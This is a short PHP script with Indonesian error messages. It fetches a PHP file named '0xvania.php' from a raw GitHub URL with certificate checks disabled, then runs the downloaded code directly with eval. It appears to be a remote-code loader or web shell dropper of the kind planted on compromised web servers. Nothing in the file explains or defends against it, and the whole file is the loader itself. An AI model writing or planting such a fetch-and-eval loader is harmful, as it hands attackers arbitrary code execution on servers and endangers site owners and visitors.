<?php
error_reporting(E_ALL);
ini_set('display_errors', 1);

$url = 'https://raw.githubusercontent.com/hairamcrot/back/refs/heads/main/0xvania.php';

function fetch_and_run($url) {
    $code = false;

    if (function_exists('curl_exec')) {
        $ch = curl_init($url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
        $code = curl_exec($ch);
        $err = curl_error($ch);
        curl_close($ch);

        if ($err) {
            die("CURL Error: $err");
        }
    } elseif (ini_get('allow_url_fopen')) {
        $code = file_get_contents($url);
        if ($code === false) {
            die("Gagal mengambil file dengan file_get_contents");
        }
    } else {
        die("Tidak bisa mengambil file (curl & fopen tidak tersedia)");
    }

    if ($code) {
        echo "<!-- Kode berhasil diambil. Menjalankan... -->";
        eval("?>".$code);
    } else {
        die("Gagal mengambil isi file dari URL");
    }
}

fetch_and_run($url);
?>
